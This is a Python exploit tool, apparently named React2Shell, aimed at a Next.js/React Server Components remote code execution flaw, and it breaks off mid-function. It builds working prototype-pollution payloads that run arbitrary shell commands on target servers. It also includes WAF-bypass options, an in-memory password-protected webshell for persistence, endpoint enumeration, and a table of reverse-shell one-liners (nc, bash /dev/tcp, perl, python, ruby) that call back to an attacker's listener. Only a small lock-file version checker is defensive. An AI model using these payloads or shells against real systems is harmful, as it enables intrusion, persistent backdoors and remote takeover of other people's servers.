#!/usr/bin/env python3
"""
React2Shell - CVE-2025-55182 Scanner & Exploit
Next.js/React Server Components RCE via Prototype Pollution

Author: sho-luv
https://github.com/sho-luv/React2Shell
"""

import argparse
import sys
import os
import re
import json
import socket
import select
import random
import string
import base64
import threading
import time
import shlex
import ipaddress
import readline  # For command history in interactive mode
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, unquote
from typing import Optional, Tuple, List, Dict
from pathlib import Path

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("\033[91m[!] Error: 'requests' library required. Install with: pip install requests\033[0m")
    sys.exit(1)

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False


# =============================================================================
# CONSTANTS
# =============================================================================

# Protocol markers
REDIRECT_PREFIX = "NEXT_REDIRECT"
REDIRECT_FORMAT = "{prefix};push;/login?a={encoded};307;"
FLIGHT_STATUS_RESOLVED = "resolved_model"
FLIGHT_BLOB_MARKER = "$B1337"
FLIGHT_CHUNKS_REF = "$Q2"

# Payload structure
PROTO_POLLUTION_REF = "$1:__proto__:then"
FUNC_CONSTRUCTOR_REF = "$1:constructor:constructor"

# Default paths
DEFAULT_PATH = "/"
DEFAULT_OUTPUT_FILE = "/tmp/r2s_out.txt"

# Rate limiting defaults
DEFAULT_RATE_LIMIT = 0  # 0 = no limit
DEFAULT_RATE_DELAY = 0.0  # seconds between requests


# =============================================================================
# VULNERABLE VERSION DETECTION
# =============================================================================

# Known vulnerable version ranges for CVE-2025-55182
VULNERABLE_VERSIONS = {
    "next": {
        # Format: (min_version, max_version, patched_version)
        "ranges": [
            ("14.0.0", "14.2.25", "14.2.26"),  # 14.x series
            ("15.0.0", "15.1.6", "15.1.7"),    # 15.0-15.1 series
            ("15.2.0", "15.2.3", "15.2.4"),    # 15.2 series
            ("15.3.0", "15.4.7", "15.4.8"),    # 15.3-15.4 series (lab versions)
        ]
    },
    "react": {
        "ranges": [
            ("19.0.0", "19.2.0", "19.2.1"),    # React 19.0.0-19.2.0
        ]
    },
    "waku": {
        "ranges": [
            ("0.0.0", "0.27.1", "0.27.2"),     # All Waku versions before 0.27.2
        ]
    },
    "react-router": {
        "ranges": [
            ("7.0.0", "7.5.0", "7.5.1"),       # React Router with RSC preview
        ]
    }
}

# =============================================================================
# FRAMEWORK-SPECIFIC RSC ENDPOINTS
# =============================================================================

# Framework detection and RSC endpoint patterns
FRAMEWORK_ENDPOINTS = {
    "nextjs": {
        "name": "Next.js",
        "paths": ["/", "/api", "/dashboard", "/admin", "/login", "/app"],
        "indicators": ["_next", "Next.js", "__NEXT_DATA__"],
        "headers": {"Next-Action": True, "X-Nextjs-Request-Id": True},
    },
    "react-router": {
        "name": "React Router",
        "paths": ["/_rsc", "/rsc", "/__rsc", "/action", "/_action"],
        "indicators": ["react-router", "remix"],
        "headers": {"X-React-Router-Action": True},
    },
    "waku": {
        "name": "Waku",
        "paths": ["/RSC/F/action/run.txt", "/RSC/F/_action/run.txt", "/RSC/F/rpc/call.txt"],
        "indicators": ["waku", "Waku"],
        "headers": {},
        "random_endpoint": True,  # Waku uses randomly generated endpoints
    },
    "expo": {
        "name": "Expo",
        "paths": ["/_expo/rsc", "/expo/_rsc", "/_rsc", "/rsc"],
        "indicators": ["expo", "Expo"],
        "headers": {},
    },
    "vite-rsc": {
        "name": "Vite RSC Plugin",
        "paths": ["/__rsc", "/_rsc", "/rsc"],
        "indicators": ["vite", "@vitejs/plugin-rsc"],
        "headers": {},
    },
    "parcel-rsc": {
        "name": "Parcel RSC",
        "paths": ["/__parcel_rsc", "/_rsc", "/rsc"],
        "indicators": ["parcel", "@parcel/rsc"],
        "headers": {},
    },
    "redwood": {
        "name": "RedwoodJS",
        "paths": ["/.redwood/functions", "/api/rsc", "/_rsc"],
        "indicators": ["redwood", "rwsdk"],
        "headers": {},
    },
}

# Common RSC endpoint wordlist for enumeration
RSC_ENDPOINT_WORDLIST = [
    "/", "/_rsc", "/rsc", "/__rsc", "/RSC/",
    "/action", "/_action", "/__action",
    "/api", "/api/rsc", "/api/action",
    "/app", "/dashboard", "/admin", "/login", "/settings",
    "/_expo/rsc", "/expo/_rsc",
    "/__RSC__/", "/waku/", "/_waku/rsc",
    "/__parcel_rsc", "/.redwood/functions",
]


# =============================================================================
# COLORS - Metasploit-style output
# =============================================================================

class Colors:
    # Standard colors
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"

    # Styles
    BOLD = "\033[1m"
    DIM = "\033[2m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

    # Metasploit-style prefixes
    @classmethod
    def success(cls, msg: str) -> str:
        return f"{cls.GREEN}[+]{cls.RESET} {msg}"

    @classmethod
    def info(cls, msg: str) -> str:
        return f"{cls.BLUE}[*]{cls.RESET} {msg}"

    @classmethod
    def warning(cls, msg: str) -> str:
        return f"{cls.YELLOW}[!]{cls.RESET} {msg}"

    @classmethod
    def error(cls, msg: str) -> str:
        return f"{cls.RED}[-]{cls.RESET} {msg}"

    @classmethod
    def vuln(cls, msg: str) -> str:
        return f"{cls.RED}{cls.BOLD}[+]{cls.RESET} {msg} {cls.RED}{cls.BOLD}[VULNERABLE]{cls.RESET}"

    @classmethod
    def safe(cls, msg: str) -> str:
        return f"{cls.GREEN}{cls.BOLD}[-]{cls.RESET} {msg} {cls.GREEN}{cls.BOLD}[NOT VULNERABLE]{cls.RESET}"

    @classmethod
    def status(cls, msg: str) -> str:
        return f"{cls.CYAN}[>]{cls.RESET} {msg}"


def disable_colors():
    """Disable all color output."""
    Colors.RED = ""
    Colors.GREEN = ""
    Colors.YELLOW = ""
    Colors.BLUE = ""
    Colors.MAGENTA = ""
    Colors.CYAN = ""
    Colors.WHITE = ""
    Colors.GRAY = ""
    Colors.BOLD = ""
    Colors.DIM = ""
    Colors.UNDERLINE = ""
    Colors.RESET = ""


# =============================================================================
# BANNER
# =============================================================================

BANNER = f"""
{Colors.RED}{Colors.BOLD}
  ____                 _   ____  ____  _          _ _
 |  _ \\ ___  __ _  ___| |_|___ \\/ ___|| |__   ___| | |
 | |_) / _ \\/ _` |/ __| __| __) \\___ \\| '_ \\ / _ \\ | |
 |  _ <  __/ (_| | (__| |_ / __/ ___) | | | |  __/ | |
 |_| \\_\\___|\\__,_|\\___|\\__|_____|____/|_| |_|\\___|_|_|
{Colors.RESET}
{Colors.CYAN}  CVE-2025-55182 | Next.js/React RCE Scanner & Exploit{Colors.RESET}
{Colors.GRAY}  github.com/sho-luv/React2Shell{Colors.RESET}
"""


# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

def random_string(length: int, chars: str = string.ascii_letters + string.digits) -> str:
    return ''.join(random.choices(chars, k=length))


def random_hex(length: int = 8) -> str:
    return random_string(length, string.hexdigits.lower())


def random_boundary() -> str:
    return f"----WebKitFormBoundary{random_string(16)}"


def normalize_url(url: str) -> str:
    """Normalize URL to include scheme if missing."""
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    return url.rstrip("/")


def is_file(path: str) -> bool:
    """Check if input is a file path."""
    return os.path.isfile(path)


def is_url(text: str) -> bool:
    """Check if input looks like a URL."""
    text = text.strip()
    if is_file(text):
        return False
    return bool(re.match(r'^(https?://)?[\w\-.]+(:\d+)?(/.*)?$', text))


def load_targets(input_str: str) -> List[str]:
    """Load targets from file or return single URL."""
    if is_file(input_str):
        targets = []
        with open(input_str, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
        return targets
    return [input_str]


def load_paths(path_input: str) -> List[str]:
    """Load paths from file or parse comma-separated."""
    if is_file(path_input):
        paths = []
        with open(path_input, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith('/'):
                        line = '/' + line
                    paths.append(line)
        return paths
    # Comma-separated
    return [p.strip() if p.strip().startswith('/') else '/' + p.strip()
            for p in path_input.split(',')]


def parse_version(version_str: str) -> Tuple[int, ...]:
    """Parse version string into tuple for comparison."""
    # Remove any prefix like ^ or ~ and suffixes like -canary
    version_str = re.sub(r'^[^\d]*', '', version_str)
    version_str = re.sub(r'-.*$', '', version_str)
    parts = version_str.split('.')
    return tuple(int(p) for p in parts if p.isdigit())


def version_in_range(version: str, min_ver: str, max_ver: str) -> bool:
    """Check if version is within vulnerable range."""
    try:
        v = parse_version(version)
        v_min = parse_version(min_ver)
        v_max = parse_version(max_ver)
        return v_min <= v <= v_max
    except (ValueError, TypeError, AttributeError):
        return False


def is_version_vulnerable(package: str, version: str) -> Tuple[bool, str]:
    """Check if package version is vulnerable."""
    if package not in VULNERABLE_VERSIONS:
        return False, ""

    for min_ver, max_ver, patched in VULNERABLE_VERSIONS[package]["ranges"]:
        if version_in_range(version, min_ver, max_ver):
            return True, patched
    return False, ""


def encode_unicode(data: str) -> str:
    """Encode string characters as Unicode escapes for WAF bypass."""
    result = []
    in_string = False
    escape_next = False

    for char in data:
        if escape_next:
            result.append(char)
            escape_next = False
            continue

        if char == '\\':
            result.append(char)
            escape_next = True
            continue

        if char == '"':
            in_string = not in_string
            result.append(char)
            continue

        # Only encode characters inside strings, not JSON structure
        if in_string and char.isalpha():
            result.append(f'\\u{ord(char):04x}')
        else:
            result.append(char)

    return ''.join(result)


def scan_local_project(project_path: str) -> List[Dict]:
    """Scan local project for vulnerable Next.js/React versions."""
    results = []
    project_path = Path(project_path)

    if not project_path.exists():
        return [{"error": f"Path does not exist: {project_path}"}]

    # Files to check
    lock_files = [
        "package.json",
        "package-lock.json",
        "yarn.lock",
        "pnpm-lock.yaml"
    ]

    # Walk directory tree, skip node_modules
    for root, dirs, files in os.walk(project_path):
        # Skip node_modules
        dirs[:] = [d for d in dirs if d != 'node_modules']

        for lock_file in lock_files:
            if lock_file in files:
                file_path = Path(root) / lock_file
                result = check_lock_file(file_path)
                if result:
                    results.append(result)

    return results


def check_lock_file(file_path: Path) -> Optional[Dict]:
    """Check a lock file for vulnerable versions."""
    result = {
        "file": str(file_path),
        "packages": [],
        "vulnerable": False
    }

    try:
        content = file_path.read_text()

        if file_path.name == "package.json":
            data = json.loads(content)
            deps = {}
            deps.update(data.get("dependencies", {}))
            deps.update(data.get("devDependencies", {}))

            for pkg in ["next", "react"]:
                if pkg in deps:
                    version = deps[pkg].lstrip('^~')
                    vuln, patched = is_version_vulnerable(pkg, version)
                    result["packages"].append({
                        "name": pkg,
                        "version": version,
                        "vulnerable": vuln,
                        "patched_version": patched
                    })
                    if vuln:
                        result["vulnerable"] = True

        elif file_path.name == "package-lock.json":
            data = json.loads(content)
            packages = data.get("packages", data.get("dependencies", {}))

            for pkg_name, pkg_data in packages.items():
                name = pkg_name.split("/")[-1] if "/" in pkg_name else pkg_name
                if name in ["next", "react"]:
                    version = pkg_data.get("version", "")
                    if version:
                        vuln, patched = is_version_vulnerable(name, version)
                        result["packages"].append({
                            "name": name,
                            "version": version,
                            "vulnerable": vuln,
                            "patched_version": patched
                        })
                        if vuln:
                            result["vulnerable"] = True

        elif file_path.name == "yarn.lock":
            # Parse yarn.lock format
            for match in re.finditer(r'"?(next|react)@[^"]*"?.*?version "([^"]+)"', content, re.DOTALL):
                pkg, version = match.groups()
                vuln, patched = is_version_vulnerable(pkg, version)
                result["packages"].append({
                    "name": pkg,
                    "version": version,
                    "vulnerable": vuln,
                    "patched_version": patched
                })
                if vuln:
                    result["vulnerable"] = True

        elif file_path.name == "pnpm-lock.yaml":
            # Parse pnpm-lock.yaml
            for match in re.finditer(r'/(next|react)@(\d+\.\d+\.\d+)', content):
                pkg, version = match.groups()
                vuln, patched = is_version_vulnerable(pkg, version)
                result["packages"].append({
                    "name": pkg,
                    "version": version,
                    "vulnerable": vuln,
                    "patched_version": patched
                })
                if vuln:
                    result["vulnerable"] = True

    except Exception as e:
        result["error"] = str(e)

    return result if result["packages"] or "error" in result else None


# =============================================================================
# PAYLOAD BUILDERS
# =============================================================================

def escape_shell_arg(cmd: str) -> str:
    """
    Escape a command for safe embedding in shell context.
    Uses single-quote escaping: replace ' with '\''
    """
    # For single-quoted strings, escape single quotes
    return cmd.replace("'", "'\\''")


def build_multipart_body(boundary: str, parts: List[Tuple[str, str]],
                         junk_data: Optional[Tuple[str, str]] = None) -> str:
    """
    Build multipart form body from parts.

    Args:
        boundary: The boundary string (without --)
        parts: List of (field_name, field_value) tuples
        junk_data: Optional (field_name, junk_content) for WAF bypass
    """
    body_parts = []

    # Add junk data first if provided (for WAF bypass)
    if junk_data:
        body_parts.extend([
            f"--{boundary}",
            f'Content-Disposition: form-data; name="{junk_data[0]}"',
            "",
            junk_data[1]
        ])

    # Add actual payload parts
    for field_name, field_value in parts:
        body_parts.extend([
            f"--{boundary}",
            f'Content-Disposition: form-data; name="{field_name}"',
            "",
            field_value
        ])

    body_parts.append(f"--{boundary}--")
    return "\r\n".join(body_parts)


def build_rce_payload(cmd: str, windows: bool = False, waf_bypass: bool = False,
                      waf_size_kb: int = 128, vercel_bypass: bool = False,
                      unicode_bypass: bool = False) -> Tuple[str, str]:
    """Build RCE payload with various bypass options using json.dumps for proper escaping."""
    boundary = random_boundary()
    boundary_clean = boundary.replace("----", "")

    # Properly escape command for shell execution
    cmd_escaped = escape_shell_arg(cmd)

    if windows:
        exec_cmd = f"powershell -c '{cmd_escaped}'"
    else:
        exec_cmd = cmd_escaped

    # Build JavaScript prefix payload
    prefix_code = (
        f"var res=process.mainModule.require('child_process').execSync('{exec_cmd}')"
        f".toString().trim();var encoded=Buffer.from(res).toString('base64');"
        f"throw Object.assign(new Error('{REDIRECT_PREFIX}'),"
        f"{{digest:'{REDIRECT_PREFIX};push;/login?a='+encoded+';307;'}});"
    )

    # Build payload object using proper JSON serialization
    part0_obj = {
        "then": PROTO_POLLUTION_REF,
        "status": FLIGHT_STATUS_RESOLVED,
        "reason": -1,
        "value": f'{{"then":"{FLIGHT_BLOB_MARKER}"}}',
        "_response": {
            "_prefix": prefix_code,
            "_chunks": FLIGHT_CHUNKS_REF,
            "_formData": {
                "get": "$3:\"$$:constructor:constructor" if vercel_bypass else FUNC_CONSTRUCTOR_REF
            }
        }
    }
    part0 = json.dumps(part0_obj)

    # Apply unicode encoding for WAF bypass
    if unicode_bypass:
        part0 = encode_unicode(part0)

    # Prepare junk data for WAF bypass
    junk = None
    if waf_bypass:
        junk_name = random_string(12, string.ascii_lowercase)
        junk_content = random_string(waf_size_kb * 1024)
        junk = (junk_name, junk_content)

    # Build parts list
    parts = [("0", part0), ("1", '"$@0"'), ("2", "[]")]

    if vercel_bypass:
        parts.append(("3", '{""\\"$$":{}}'))

    body = build_multipart_body(boundary_clean, parts, junk)
    content_type = f"multipart/form-data; boundary={boundary_clean}"
    return body, content_type


def build_safe_payload() -> Tuple[str, str]:
    """Build safe side-channel detection payload (no code execution)."""
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f"{{}}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f'["$1:aa:aa"]\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def build_check_payload() -> Tuple[str, str, str]:
    """Build vulnerability check payload (math operation)."""
    boundary = random_boundary()
    boundary_clean = boundary.replace("----", "")

    # Random math for detection
    num1 = random.randint(100, 999)
    num2 = random.randint(100, 999)
    expected = num1 * num2

    prefix = (
        f"var res=process.mainModule.require('child_process').execSync('echo $(({num1}*{num2}))')"
        f".toString().trim();throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    body = "\r\n".join([
        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}",
        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"",
        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]",
        f"--{boundary_clean}--"
    ])

    content_type = f"multipart/form-data; boundary={boundary_clean}"
    return body, content_type, str(expected)


def build_waku_payload(cmd: str, windows: bool = False, waf_bypass: bool = False,
                       waf_size_kb: int = 128) -> Tuple[str, str]:
    """
    Build Waku-specific RCE payload.
    Waku requires path format: /RSC/F/{file}/{name}.txt for function calls.
    Uses process.getBuiltinModule for ESM compatibility (Node.js 20.16+).

    Note: Waku doesn't expose error digest in HTTP response, so output
    exfiltration requires file write + read or out-of-band methods.
    For CLI, we write output to /tmp/r2s_out.txt and read it back.
    """
    boundary = random_boundary()
    boundary_clean = boundary.replace("----", "")

    # Escape for shell command (single quotes)
    cmd_escaped = cmd.replace("'", "'\"'\"'")
    if windows:
        exec_cmd = f"powershell -c '{cmd_escaped}'"
    else:
        exec_cmd = cmd_escaped

    # Waku payload - writes output to file since Waku doesn't expose digest in response
    # Use getBuiltinModule for ESM compatibility
    prefix_code = (
        f"var cp=process.getBuiltinModule?process.getBuiltinModule('child_process'):"
        f"process.mainModule.require('child_process');"
        f"var fs=process.getBuiltinModule?process.getBuiltinModule('fs'):"
        f"process.mainModule.require('fs');"
        f"var res=cp.execSync('{exec_cmd}').toString();"
        f"fs.writeFileSync('/tmp/r2s_out.txt',res);"
        f"throw new Error('RCE_DONE')//"
    )

    # Build payload as proper dict and serialize with json.dumps for correct escaping
    part0_obj = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_code,
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }
    part0 = json.dumps(part0_obj)

    body_parts = []
    if waf_bypass:
        junk_name = random_string(12, string.ascii_lowercase)
        junk_data = random_string(waf_size_kb * 1024)
        body_parts.extend([
            f"--{boundary_clean}",
            f'Content-Disposition: form-data; name="{junk_name}"',
            "",
            junk_data
        ])

    body_parts.extend([
        f"--{boundary_clean}",
        'Content-Disposition: form-data; name="0"',
        "",
        part0,
        f"--{boundary_clean}",
        'Content-Disposition: form-data; name="1"',
        "",
        '"$@0"',
        f"--{boundary_clean}",
        'Content-Disposition: form-data; name="2"',
        "",
        "[]",
        f"--{boundary_clean}--"
    ])

    body = "\r\n".join(body_parts)
    content_type = f"multipart/form-data; boundary={boundary_clean}"
    return body, content_type


def build_webshell_payload(password: str = "react2shell", port: int = 1337) -> Tuple[str, str]:
    """
    Build in-memory webshell payload for persistence.
    Creates a new HTTP server on a separate port for backdoor access.
    Access via: curl 'http://target:<port>/?p=<password>&cmd=<command>'
    """
    boundary = random_boundary()
    boundary_clean = boundary.replace("----", "")

    # In-memory webshell - creates new HTTP server on specified port
    # Uses ?p=<password>&cmd=<command> for authentication and execution
    webshell_code = (
        f"if(!global._r2s){{"
        f"global._r2s=true;"
        f"var h=process.mainModule.require('http');"
        f"var c=process.mainModule.require('child_process');"
        f"var u=process.mainModule.require('url');"
        f"h.createServer(function(q,r){{"
        f"var p=u.parse(q.url,true).query;"
        f"if(p.p==='{password}'&&p.cmd){{"
        f"try{{var o=c.execSync(p.cmd).toString();r.writeHead(200);r.end(o);}}"
        f"catch(e){{r.writeHead(500);r.end(e.message);}}"
        f"}}else{{r.writeHead(403);r.end('Forbidden');}}"
        f"}}).listen({port});"
        f"}};"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest:'NEXT_REDIRECT;push;/shell-installed-{port};307;'}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + webshell_code + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    body = "\r\n".join([
        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{part0}",
        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"",
        f"--{boundary_clean}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]",
        f"--{boundary_clean}--"
    ])

    content_type = f"multipart/form-data; boundary={boundary_clean}"
    return body, content_type


def build_react_router_payload(cmd: str, windows: bool = False) -> Tuple[str, str]:
    """
    Build React Router RSC payload.
    Uses process.getBuiltinModule for ESM compatibility (Node.js 20.16+).
    Falls back to process.mainModule.require for CommonJS environments.
    """
    boundary = random_boundary()
    boundary_clean = boundary.replace("----", "")

    # Escape for shell command (single quotes)
    cmd_escaped = cmd.replace("'", "'\"'\"'")
    if windows:
        exec_cmd = f"powershell -c '{cmd_escaped}'"
    else:
        exec_cmd = cmd_escaped

    # Use process.getBuiltinModule for ESM (Node 20.16+), fallback to mainModule.require for CJS
    prefix_code = (
        f"var cp=process.getBuiltinModule?process.getBuiltinModule('child_process'):"
        f"process.mainModule.require('child_process');"
        f"var res=cp.execSync('{exec_cmd}').toString().trim();"
        f"var encoded=Buffer.from(res).toString('base64');"
        f"throw Object.assign(new Error('REDIRECT'),"
        f"{{digest:'REDIRECT;push;/login?a='+encoded+';307;'}})//"
    )

    # Build payload as a proper dict and serialize with json.dumps for correct escaping
    part0_obj = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": prefix_code,
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }
    part0 = json.dumps(part0_obj)

    body = "\r\n".join([
        f"--{boundary_clean}",
        'Content-Disposition: form-data; name="0"',
        "",
        part0,
        f"--{boundary_clean}",
        'Content-Disposition: form-data; name="1"',
        "",
        '"$@0"',
        f"--{boundary_clean}",
        'Content-Disposition: form-data; name="2"',
        "",
        "[]",
        f"--{boundary_clean}--"
    ])

    content_type = f"multipart/form-data; boundary={boundary_clean}"
    return body, content_type


# =============================================================================
# FRAMEWORK DETECTION & ENDPOINT ENUMERATION
# =============================================================================

def detect_framework(url: str, timeout: int = 5) -> Tuple[str, List[str]]:
    """
    Detect which RSC framework is running on the target.
    Returns (framework_name, suggested_paths).
    """
    url = normalize_url(url)
    detected = "unknown"
    suggested_paths = RSC_ENDPOINT_WORDLIST.copy()

    try:
        response = requests.get(
            url,
            timeout=timeout,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 React2Shell/2.0"}
        )

        headers_lower = {k.lower(): v for k, v in response.headers.items()}
        body = response.text.lower()

        # Check each framework's indicators
        for fw_key, fw_config in FRAMEWORK_ENDPOINTS.items():
            for indicator in fw_config["indicators"]:
                if indicator.lower() in body or indicator.lower() in str(headers_lower):
                    detected = fw_key
                    suggested_paths = fw_config["paths"] + RSC_ENDPOINT_WORDLIST
                    break
            if detected != "unknown":
                break

        # Check headers for Next.js specifically
        if "x-powered-by" in headers_lower and "next" in headers_lower["x-powered-by"].lower():
            detected = "nextjs"
            suggested_paths = FRAMEWORK_ENDPOINTS["nextjs"]["paths"] + RSC_ENDPOINT_WORDLIST

    except Exception:
        pass

    return detected, list(dict.fromkeys(suggested_paths))  # Remove duplicates


def enumerate_rsc_endpoints(url: str, paths: List[str] = None, timeout: int = 5,
                            threads: int = 10, verbose: bool = False) -> List[Dict]:
    """
    Enumerate valid RSC endpoints on a target.
    Returns list of discovered endpoints with their status.
    """
    url = normalize_url(url)
    paths = paths or RSC_ENDPOINT_WORDLIST
    results = []

    def check_endpoint(path: str) -> Optional[Dict]:
        target = f"{url}{path}"
        try:
            # Send a minimal RSC-like request to see if endpoint responds
            headers = {
                "User-Agent": "Mozilla/5.0 React2Shell/2.0",
                "Content-Type": "multipart/form-data; boundary=----test",
                "Next-Action": "test",
            }
            response = requests.post(
                target,
                headers=headers,
                data="------test\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{}\r\n------test--",
                timeout=timeout,
                verify=False
            )

            # RSC endpoints typically return specific status codes or headers
            is_rsc = (
                response.status_code in [200, 303, 307, 400, 500] and
                (
                    "x-action-redirect" in response.headers or
                    "text/x-component" in response.headers.get("content-type", "") or
                    response.status_code == 500  # RSC often errors on malformed input
                )
            )

            if is_rsc or response.status_code != 404:
                return {
                    "path": path,
                    "url": target,
                    "status": response.status_code,
                    "likely_rsc": is_rsc,
                    "content_type": response.headers.get("content-type", ""),
                }
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_endpoint, p): p for p in paths}
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
                if verbose:
                    status = "RSC" if result["likely_rsc"] else "OK"
                    print(Colors.info(f"Found: {result['path']} [{result['status']}] ({status})"))

    return sorted(results, key=lambda x: (not x["likely_rsc"], x["status"]))


# =============================================================================
# REVERSE SHELL
# =============================================================================

REVERSE_SHELLS = {
    "nc": "nc -e sh {lhost} {lport} || nc {lhost} {lport} -e /bin/sh &",
    "nc-mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f &",
    "sh": "sh -i >& /dev/tcp/{lhost}/{lport} 0>&1 &",
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &",
    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};' &",
    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])' &",
    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' &",
}


def get_reverse_shell_cmd(shell_type: str, lhost: str, lport: int) -> str:
    """Get reverse shell command."""
    template = REVERSE_SHELLS.get(shell_type.lower(), REVERSE_SHELLS["nc"])
    return template.format(lhost=lhost, lport=lport)


def start_listener(lhost: str, lport: int) -> Optional[socket.socket]:
    """Start reverse shell listener."""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", lport))
        server.listen(1)
        server.settimeout(30)
        return server
    except Exception as e:
        print(Colors.error(f"Failed to start listener: {e}"))
        return None


def interactive_shell(client: socket.socket):
    """Interactive shell session."""
    print(Colors.success("Shell connected! Type 'exit' to quit.\n"))
    try:
        while True:
            ready, _, _ = select.select([client, sys.stdin], [], [], 0.1)
            if client in ready:
                data = client.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode('utf-8', errors='ignore'))
                sys.stdout.flush()
            if sys.stdin in ready:
                cmd = sys.stdin.readline()
                if cmd.strip().lower() == 'exit':
                    break
                client.send(cmd.encode())
    except KeyboardInterrupt:
        pass
    finally:
        client.close()


# =============================================================================
# SCANNER
# =============================================================================

class React2Shell:
    def __init__(self, timeout: int = 10, verify_ssl: bool = False,
                 user_agent: str = None, headers: dict = None,
                 proxy: str = None):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.user_agent = user_agent or f"Mozilla/5.0 React2Shell/2.0"
        self.custom_headers = headers or {}
        self.proxy = proxy
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _build_headers(self, content_type: str, framework: str = "nextjs") -> dict:
        """Build request headers based on framework."""
        headers = {
            "User-Agent": self.user_agent,
            "Content-Type": content_type,
        }

        # Framework-specific headers
        if framework in ("nextjs", "auto"):
            headers["Next-Action"] = random_string(random.randint(1, 10), string.ascii_lowercase + string.digits)
            headers["X-Nextjs-Request-Id"] = random_hex(8)
            headers["X-Nextjs-Html-Request-Id"] = random_string(21)
        elif framework == "waku":
            headers["Accept"] = "text/x-component"
            headers["rsc-action-id"] = random_string(8, string.ascii_lowercase + string.digits)
        elif framework == "react-router":
            headers["Accept"] = "text/x-component"
            headers["X-React-Router-Action"] = random_string(8, string.ascii_lowercase + string.digits)
        elif framework in ("vite-rsc", "parcel-rsc"):
            headers["Accept"] = "text/x-component"
            headers["rsc-action-id"] = random_string(8, string.ascii_lowercase + string.digits)
        else:
            # Default to Next.js style headers
            headers["Next-Action"] = random_string(random.randint(1, 10), string.ascii_lowercase + string.digits)

        headers.update(self.custom_headers)
        return headers

    def _send_request(self, url: str, body: str, content_type: str, framework: str = "nextjs") -> Tuple[Optional[requests.Response], Optional[str]]:
        """Send exploit request."""
        headers = self._build_headers(content_type, framework)
        try:
            response = requests.post(
                url,
                headers=headers,
                data=body.encode('utf-8'),
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False,
                proxies=self.proxies
            )
            return response, None
        except requests.exceptions.SSLError as e:
            return None, f"SSL Error: {e}"
        except requests.exceptions.ConnectionError as e:
